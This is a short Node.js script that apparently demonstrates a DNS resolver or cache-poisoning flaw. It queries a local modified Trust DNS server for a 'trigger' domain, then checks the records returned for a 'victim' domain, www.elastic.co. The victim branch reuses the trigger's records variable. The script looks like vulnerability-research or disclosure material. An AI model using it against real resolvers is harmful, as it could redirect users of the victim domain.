const dns = require('dns');

// Before running example, build and run modified Trust DNS server:
// 1. cargo build --release -p trust-dns
// 2. sudo ./target/release/named -c ./tests/test-data/named_test_configs/example.toml -z ./tests/test-data/named_test_configs
dns.setServers(['127.0.0.1']);
console.log(`DNS servers: ${JSON.stringify(dns.getServers())}`);
console.log(`Trigger: trigger.example.com\nVictim: www.elastic.co\n`);

dns.resolveAny('trigger.example.com', (err, resolveRecords) => {
  console.log(`Trigger Resolve Records: ${JSON.stringify(resolveRecords)}`);

  if (Array.isArray(resolveRecords) && resolveRecords.length > 0) {
    dns.lookup(resolveRecords[0].value, (err, lookupRecords) => {
      console.log(`Trigger Lookup Records: ${JSON.stringify(lookupRecords)}`);
    });
  } else {
    console.log('There are no resolved records, performing lookup for Trigger directly.');
    dns.lookup('trigger.example.com', (err, lookupRecords) => {
      console.log(`\nTrigger Lookup Records (direct lookup): ${JSON.stringify(lookupRecords)}`);
    });
  }


  dns.resolveAny('www.elastic.co', (err, records) => {
    console.log(`\nVictim Resolve Records: ${JSON.stringify(records)}`);

    if (Array.isArray(resolveRecords) && resolveRecords.length > 0) {
      dns.lookup(resolveRecords[0].value, (err, lookupRecords) => {
        console.log(`Trigger Lookup Records: ${JSON.stringify(lookupRecords)}`);
      });
    } else {
      console.log('There are no resolved records, performing lookup for Victim directly.');
      dns.lookup('www.elastic.co', (err, lookupRecords) => {
        console.log(`\nVictim Lookup Records (direct lookup): ${JSON.stringify(lookupRecords)}`);
      });
    }
  });
});

